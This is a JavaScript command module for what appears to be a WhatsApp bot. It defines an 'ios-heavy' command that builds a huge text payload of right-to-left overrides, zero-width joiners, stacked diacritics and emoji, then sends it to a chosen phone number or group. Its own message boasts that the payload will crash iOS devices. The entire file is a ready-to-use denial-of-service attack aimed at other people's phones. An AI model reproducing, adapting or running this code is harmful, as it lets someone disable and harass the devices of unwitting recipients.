export default {
  name: "ios-heavy",
  description: "Send iOS heavy Unicode + emoji crash",
  async execute(msg, { sock, args }) {
    try {
      let target = args[0];

      if (!target) {
        return sock.sendMessage(msg.key.remoteJid, {
          text: `⚠️ Usage: ?ios-heavy <number/group>\n\nExample:\n?ios-heavy 234XXXXXXXXXX\n?ios-heavy 120XXXXXXX@g.us`
        });
      }

      // Format target
      if (!target.includes("@g.us") && !target.includes("@s.whatsapp.net")) {
        if (target.length < 11) {
          return sock.sendMessage(msg.key.remoteJid, { 
            text: "⚠️ Invalid number. Use format: 234XXXXXXXXXX" 
          });
        }
        target = target + "@s.whatsapp.net";
      }

      console.log(`[INFO] Executing ios-heavy on target: ${target}`);

      // Generate iOS heavy payload
      const rtl = "\u202E";
      const lrm = "\u200E";
      const zwj = "\u200D";
      const zwnj = "\u200C";
      const diacritics = "\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307";
      const emoji = "👨‍👩‍👧‍👦";
      
      let payload = "";
      for(let i = 0; i < 20_000; i++) {
        payload += rtl + emoji + diacritics.repeat(15) + zwj + zwnj + lrm + "\n";
      }

      // Send the payload
      await sock.sendMessage(target, { text: payload });

      await sock.sendMessage(msg.key.remoteJid, {
        text: `💀 iOS heavy crash sent to ${target}!\n📊 Payload size: ${payload.length} characters\n⚠️ WARNING: This WILL crash iOS devices!`
      });

    } catch (error) {
      console.error(`[ERROR] iOS-heavy command failed:`, error);
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Failed to send iOS heavy crash: " + error.message
      });
    }
  }
};